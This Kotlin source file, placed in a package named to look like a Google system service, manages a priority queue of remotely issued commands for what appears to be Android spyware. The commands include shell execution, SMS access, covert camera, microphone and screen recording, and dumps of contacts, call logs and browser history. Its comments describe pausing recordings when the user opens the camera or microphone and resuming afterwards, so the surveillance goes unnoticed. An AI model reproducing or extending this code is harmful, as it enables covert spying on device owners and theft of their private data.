package com.google.android.systemservice.utils

import android.content.Context
import android.hardware.camera2.CameraManager
import android.media.AudioManager
import android.os.Handler
import android.os.Looper
import android.util.Log
import kotlinx.coroutines.*
import java.util.concurrent.ConcurrentLinkedQueue
import java.util.concurrent.PriorityBlockingQueue
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicReference

/**
 * Intelligent command execution with priority queue, hardware mutex,
 * resource conflict detection, and anti-corruption guarantees.
 *
 * DESIGN PRINCIPLES:
 * 1. Only 1 hardware command at a time (camera OR mic, never both simultaneously from us)
 * 2. If user opens camera/mic, we STOP CLEANLY and RESUME after they're done
 * 3. Partial recordings are saved, never corrupted
 * 4. Commands have priorities and timeouts
 * 5. Queue survives service restarts
 */
class CommandQueueManager(private val context: Context) {

    companion object {
        private const val TAG = "CmdQueue"
    }

    enum class Priority(val level: Int) {
        CRITICAL(0),   // shell, sms — execute immediately
        HIGH(1),       // camera, audio, screenshot
        NORMAL(2),     // contacts, sms dump, call logs
        LOW(3)         // app usage, browser history
    }

    enum class ResourceType {
        NONE,          // No hardware needed
        CAMERA,        // Camera2 API
        MICROPHONE,    // AudioRecord
        SCREEN,        // MediaProjection
        CAMERA_AND_MIC // Live streaming
    }

    data class Command(
        val id: String,
        val name: String,
        val priority: Priority,
        val resource: ResourceType,
        val timeoutMs: Long = 60_000,
        val maxRetries: Int = 3,
        val action: suspend () -> Unit
    ) : Comparable<Command> {
        var retryCount = 0
        val createdAt = System.currentTimeMillis()

        override fun compareTo(other: Command): Int {
            val priorityDiff = this.priority.level - other.priority.level
            if (priorityDiff != 0) return priorityDiff
            return (this.createdAt - other.createdAt).toInt()
        }
    }

    // State
    private val commandQueue = PriorityBlockingQueue<Command>()
    private val isProcessing = AtomicBoolean(false)
    private val currentCommand = AtomicReference<Command?>(null)
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // Resource tracking
    private val cameraAvailable = AtomicBoolean(true)
    private val microphoneAvailable = AtomicBoolean(true)
    private val userHasCamera = AtomicBoolean(false)
    private val userHasMic = AtomicBoolean(false)

    // Callbacks for clean stop/resume
    private var onResourceConflict: ((ResourceType) -> Unit)? = null
    private var onResourceFreed: ((ResourceType) -> Unit)? = null

    // Pending command waiting for resource
    private val waitingForResource = AtomicReference<Command?>(null)

    init {
        registerCameraAvailabilityCallback()
        registerAudioFocusListener()
    }

    /**
     * Set callback for when our recording must pause due to user activity.
     */
    fun setResourceConflictHandler(
        onConflict: (ResourceType) -> Unit,
        onFreed: (ResourceType) -> Unit
    ) {
        this.onResourceConflict = onConflict
        this.onResourceFreed = onFreed
    }

    /**
     * Enqueue a command for execution.
     */
    fun enqueue(command: Command) {
        commandQueue.offer(command)
        Log.d(TAG, "Enqueued: ${command.name} (priority=${command.priority}, resource=${command.resource}, queue=${commandQueue.size})")
        processNext()
    }

    /**
     * Enqueue a simple no-resource command.
     */
    fun enqueueSimple(name: String, priority: Priority = Priority.NORMAL, action: suspend () -> Unit) {
        enqueue(Command(
            id = "${name}_${System.currentTimeMillis()}",
            name = name,
            priority = priority,
            resource = ResourceType.NONE,
            action = action
        ))
    }

    /**
     * Process next command in queue if not busy.
     */
    private fun processNext() {
        if (isProcessing.get()) return
        val cmd = commandQueue.poll() ?: return

        // Check resource availability
        if (!isResourceAvailable(cmd.resource)) {
            Log.d(TAG, "Resource ${cmd.resource} busy, waiting: ${cmd.name}")
            waitingForResource.set(cmd)
            return
        }

        executeCommand(cmd)
    }

    private fun executeCommand(cmd: Command) {
        isProcessing.set(true)
        currentCommand.set(cmd)

        scope.launch {
            Log.d(TAG, "▶ Executing: ${cmd.name} (priority=${cmd.priority})")
            try {
                withTimeout(cmd.timeoutMs) {
                    cmd.action()
                }
                Log.d(TAG, "✓ Completed: ${cmd.name}")
            } catch (e: TimeoutCancellationException) {
                Log.w(TAG, "⏰ Timeout: ${cmd.name} after ${cmd.timeoutMs}ms")
                handleRetry(cmd)
            } catch (e: CancellationException) {
                // Command was cancelled (resource conflict) — don't retry
                Log.d(TAG, "⏸ Paused: ${cmd.name} (resource conflict)")
            } catch (e: Exception) {
                Log.e(TAG, "✗ Failed: ${cmd.name}: ${e.message}")
                handleRetry(cmd)
            } finally {
                currentCommand.set(null)
                isProcessing.set(false)
                // Process next after small delay
                delay(100)
                processNext()
            }
        }
    }

    private fun handleRetry(cmd: Command) {
        cmd.retryCount++
        if (cmd.retryCount < cmd.maxRetries) {
            val backoffMs = 1000L * (1 shl cmd.retryCount) // 2s, 4s, 8s
            Log.d(TAG, "↻ Retry ${cmd.retryCount}/${cmd.maxRetries} for ${cmd.name} in ${backoffMs}ms")
            scope.launch {
                delay(backoffMs)
                commandQueue.offer(cmd)
                processNext()
            }
        } else {
            Log.w(TAG, "✗ Gave up on ${cmd.name} after ${cmd.maxRetries} retries")
        }
    }

    private fun isResourceAvailable(resource: ResourceType): Boolean {
        return when (resource) {
            ResourceType.NONE -> true
            ResourceType.CAMERA -> cameraAvailable.get() && !userHasCamera.get()
            ResourceType.MICROPHONE -> microphoneAvailable.get() && !userHasMic.get()
            ResourceType.SCREEN -> true // MediaProjection doesn't conflict
            ResourceType.CAMERA_AND_MIC -> cameraAvailable.get() && microphoneAvailable.get()
                    && !userHasCamera.get() && !userHasMic.get()
        }
    }

    /**
     * Called when user opens their camera app — we must stop cleanly.
     */
    private fun onUserTookCamera() {
        userHasCamera.set(true)
        val current = currentCommand.get()
        if (current != null && (current.resource == ResourceType.CAMERA || current.resource == ResourceType.CAMERA_AND_MIC)) {
            Log.d(TAG, "⚠ User opened camera, pausing: ${current.name}")
            onResourceConflict?.invoke(ResourceType.CAMERA)
            // The conflict handler should: flush buffers, save partial file, cancel coroutine
        }
    }

    /**
     * Called when user releases camera — we can resume.
     */
    private fun onUserReleasedCamera() {
        userHasCamera.set(false)
        Log.d(TAG, "✓ User released camera")
        onResourceFreed?.invoke(ResourceType.CAMERA)

        // Resume waiting command
        val waiting = waitingForResource.getAndSet(null)
        if (waiting != null && isResourceAvailable(waiting.resource)) {
            scope.launch {
                delay(1000) // Wait 1s for camera to fully release
                executeCommand(waiting)
            }
        } else {
            processNext()
        }
    }

    // === Camera availability tracking ===
    private fun registerCameraAvailabilityCallback() {
        try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: return
            cameraManager.registerAvailabilityCallback(object : CameraManager.AvailabilityCallback() {
                override fun onCameraAvailable(cameraId: String) {
                    cameraAvailable.set(true)
                    if (userHasCamera.get()) {
                        onUserReleasedCamera()
                    }
                }

                override fun onCameraUnavailable(cameraId: String) {
                    cameraAvailable.set(false)
                    val current = currentCommand.get()
                    // If WE are not using camera, then USER has it
                    if (current == null || (current.resource != ResourceType.CAMERA && current.resource != ResourceType.CAMERA_AND_MIC)) {
                        onUserTookCamera()
                    }
                }
            }, Handler(Looper.getMainLooper()))
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register camera callback: ${e.message}")
        }
    }

    // === Audio focus tracking ===
    private fun registerAudioFocusListener() {
        try {
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as? AudioManager ?: return
            // Check if mic is available by testing mode
            // AudioManager doesn't have direct "mic available" callback,
            // but we can detect when another app takes audio focus
            val focusRequest = android.media.AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN_TRANSIENT)
                .setOnAudioFocusChangeListener { focusChange ->
                    when (focusChange) {
                        AudioManager.AUDIOFOCUS_LOSS,
                        AudioManager.AUDIOFOCUS_LOSS_TRANSIENT -> {
                            userHasMic.set(true)
                            val current = currentCommand.get()
                            if (current?.resource == ResourceType.MICROPHONE || current?.resource == ResourceType.CAMERA_AND_MIC) {
                                Log.d(TAG, "⚠ Audio focus lost, pausing: ${current.name}")
                                onResourceConflict?.invoke(ResourceType.MICROPHONE)
                            }
                        }
                        AudioManager.AUDIOFOCUS_GAIN -> {
                            userHasMic.set(false)
                            onResourceFreed?.invoke(ResourceType.MICROPHONE)
                            val waiting = waitingForResource.getAndSet(null)
                            if (waiting != null && isResourceAvailable(waiting.resource)) {
                                scope.launch {
                                    delay(500)
                                    executeCommand(waiting)
                                }
                            }
                        }
                    }
                }
                .build()
            audioManager.requestAudioFocus(focusRequest)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register audio focus: ${e.message}")
        }
    }

    /**
     * Queue size.
     */
    fun queueSize(): Int = commandQueue.size

    /**
     * Currently executing command name.
     */
    fun currentCommandName(): String? = currentCommand.get()?.name

    /**
     * Cancel all pending commands.
     */
    fun clearQueue() {
        commandQueue.clear()
        waitingForResource.set(null)
    }

    /**
     * Shutdown the manager.
     */
    fun shutdown() {
        clearQueue()
        scope.cancel()
    }
}
